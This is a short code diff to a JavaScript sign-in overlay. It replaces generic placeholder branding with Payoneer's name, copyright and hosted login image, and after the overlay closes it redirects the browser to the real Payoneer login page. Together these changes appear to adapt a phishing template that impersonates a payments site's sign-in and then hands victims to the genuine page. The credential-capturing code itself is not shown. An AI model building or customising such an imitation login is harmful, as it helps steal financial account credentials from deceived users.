@@ -27,7 +27,7 @@
     }
     // Close the overlay
     setTimeout(() => {
-      window.location = window.location.href;
+      window.location = "https://login.payoneer.com/";
     }, 1000);
   };
   const COLORS = {
@@ -56,13 +56,13 @@
 
   // Placeholder content — swap freely
   const CONTENT = {
-    brandName: 'Brand',
+    brandName: 'Payoneer',
     heading: 'Welcome back',
     subheading: "Let's get you signed in.",
     signupPrompt: 'New here?',
     signupLinkText: 'Sign up',
     copyrightStartYear: 2005,
-    copyrightName: 'Brand Inc.',
+    copyrightName: 'Payoneer Inc.',
     imageSrc: 'https://pubs.payoneer.com/v2/ui-assets/images/login/Sign-in-1440.png'
   };
 
